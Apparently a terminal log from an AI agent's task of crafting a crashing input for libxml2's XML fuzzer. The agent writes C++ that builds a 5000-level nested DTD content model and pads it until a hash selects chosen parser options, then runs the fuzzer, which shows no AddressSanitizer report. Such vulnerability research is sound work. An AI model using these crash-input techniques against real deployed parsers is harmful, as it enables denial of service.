@@ -1,0 +1,47 @@
+Previous response had warnings:
+WARNINGS: - Extra text detected before JSON object
+- Extra text detected after JSON object
+
+New Terminal Output:
+
+root@e38823cb2484:/# cat << 'EOF' > /tmp/search4.cc
+> #include <iostream>
+> #include <string>
+> #include <fstream>
+> #include <limits>
+> #include <functional>
+>
+> int main() {
+>     int depth = 5000;
+>     std::string s = "a";
+>     // building linear depth model
+>     for (int i = 0; i < depth; i++) {
+>         s = "(a|" + s + ")";
+>     }
+>     std::string base_xml = "<!DOCTYPE root [\n<!ELEMENT root " + s + ">\n]>\n<root><b/></root>";
+>     std::string test_str = base_xml;
+>
+>     std::hash<std::string> hasher;
+>     const int max_option_value = std::numeric_limits<int>::max();
+>
+>     for (int i = 0; i < 10000000; i++) {
+>         test_str += " "; // fast append
+>         std::size_t hash = hasher(test_str);
+>         int opt = hash % max_option_value;
+>
+>         if ((opt & 16) && (opt & (1<<19)) && !(opt & 32) && !(opt & 256) && !(opt & 1024)) {
+>             std::ofstream out("/tmp/test_huge3.xml");
+>             out << test_str;
+>             std::cout << "Found at len " << test_str.length() << " opt " << opt << std::endl;
+>             return 0;
+>         }
+>     }
+>     return 1;
+> }
+> EOF
+root@e38823cb2484:/# g++ -O3 -o /tmp/search4 /tmp/search4.cc
+root@e38823cb2484:/# /tmp/search4
+Found at len 20059 opt 758842065
+root@e38823cb2484:/# /out/libxml2_xml_read_memory_fuzzer /tmp/test_huge3.xml > /tmp/crash_output.txt 2>&1
+root@e38823cb2484:/# grep -A 5 AddressSanitizer /tmp/crash_output.txt
+root@e38823cb2484:/#
